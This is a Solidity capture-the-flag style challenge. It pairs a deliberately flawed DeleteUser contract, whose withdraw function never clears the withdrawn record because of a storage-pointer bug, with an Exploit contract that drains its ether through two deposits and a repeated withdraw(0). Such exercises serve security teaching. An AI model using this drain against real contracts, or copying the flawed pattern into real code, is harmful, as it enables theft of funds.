// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

/**
 * This contract starts with 1 ether.
 * Your goal is to steal all the ether in the contract.
 *
 */

contract DeleteUser {
    struct User {
        address addr;
        uint256 amount;
    }

    User[] private users;

    function deposit() external payable {
        users.push(User({addr: msg.sender, amount: msg.value}));
    }

    function withdraw(uint256 index) external {
        User storage user = users[index];
        require(user.addr == msg.sender);
        uint256 amount = user.amount;

        user = users[users.length - 1];
        users.pop();

        msg.sender.call{value: amount}("");
    }
}

contract Exploit {
    DeleteUser public deleteUserContract;

    constructor(DeleteUser _deleteUserContract) {
        deleteUserContract = _deleteUserContract;
    }

    receive() external payable {}

    function exploit() public {
        deleteUserContract.deposit{value: 1 ether}();
        deleteUserContract.deposit{value: 0 ether}();
        deleteUserContract.withdraw(0);
        deleteUserContract.withdraw(0);
    }
}
